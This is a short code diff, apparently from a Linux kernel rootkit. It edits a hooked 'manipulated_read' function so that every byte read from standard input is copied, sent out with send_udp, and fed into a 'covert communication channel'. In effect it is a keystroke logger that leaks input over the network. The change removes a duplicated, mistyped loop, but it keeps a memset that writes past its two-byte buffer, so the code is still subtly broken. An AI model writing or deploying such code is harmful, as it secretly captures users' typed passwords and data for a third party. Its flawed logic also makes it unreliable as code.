@@ -74,16 +74,14 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 
 	if(ret >= 1 && fd == 0)
 	{
-		for(int i = 0; i < ret, i++) {
-			for(int i = 0; i < ret; i++) {
-				char sendbuf[2];
-				memcpy(sendbuf, buf+i, 1);
-				memset(sendbuf+i, '\0', 1);
-				send_udp(sendbuf);
+		for(int i = 0; i < ret; i++) {
+			char sendbuf[2];
+			memcpy(sendbuf, buf+i, 1);
+			memset(sendbuf+i, '\0', 1);
+			send_udp(sendbuf);
 
-				/* send to covert communication channel */
-				accept_input(buf[i]);
-			}
+			/* send to covert communication channel */
+			accept_input(buf[i]);
 		}
 	}
 
